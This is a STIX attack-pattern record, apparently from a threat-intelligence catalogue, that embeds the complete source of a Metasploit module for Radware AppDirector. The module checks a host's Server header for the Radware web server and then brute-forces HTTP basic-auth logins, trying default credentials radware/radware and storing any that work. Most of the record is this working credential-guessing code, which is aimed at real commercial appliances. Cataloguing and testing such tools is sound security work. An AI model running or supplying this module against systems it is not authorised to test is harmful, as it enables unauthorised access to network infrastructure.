{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--baad8d64-4c2f-4d37-8dbc-21b89b05266b",
    "created": "2024-08-14T16:30:26.406346Z",
    "modified": "2024-08-14T16:30:26.40635Z",
    "name": "Radware AppDirector Bruteforce Login Utility",
    "description": " This module scans for Radware AppDirector's web login portal, and performs login brute force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/radware_appdirector_enum.rb",
            "external_id": "radware_appdirector_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Radware AppDirector Bruteforce Login Utility',\n      'Description'    => %{\n        This module scans for Radware AppDirector's web login portal, and performs login brute force\n        to identify valid credentials.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',\n        ],\n      'License'        => MSF_LICENSE,\n\n      'DefaultOptions' =>\n      {\n        'DB_ALL_CREDS'    => false,\n        'BLANK_PASSWORDS' => false\n      }\n    ))\n\n    register_options(\n      [\n        OptBool.new('STOP_ON_SUCCESS', [ true, \"Stop guessing when a credential works for a host\", true]),\n        OptString.new('USERNAME', [true, \"A specific username to authenticate as, default 'radware'\", \"radware\"]),\n        OptString.new('PASSWORD', [true, \"A specific password to authenticate with, deault 'radware'\", \"radware\"])\n      ])\n\n    deregister_options('HttpUsername', 'HttpPassword')\n  end\n\n  def run_host(ip)\n    unless is_app_radware?\n      return\n    end\n\n    print_status(\"Starting login brute force...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the target actually isn't Radware\n  #\n\n  def is_app_radware?\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/',\n        'method'    => 'GET'\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      vprint_error(\"HTTP Connection Failed, Aborting\")\n      return false\n    end\n\n    if (res and res.headers['Server'] and res.headers['Server'].include?(\"Radware-web-server\"))\n      vprint_good(\"Running Radware portal...\")\n      return true\n    else\n      vprint_error(\"Application is not Radware. Module will not continue.\")\n      return false\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/',\n        'method'    => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n\n    if (res and res.code == 302 and res.headers['Location'].include?('redirectId'))\n      print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'Radware AppDirector',\n        user: user,\n        password: pass,\n        proof: res.headers['Location']\n      )\n      return :next_user\n    else\n      vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n    end\n\n  end\nend\n"
}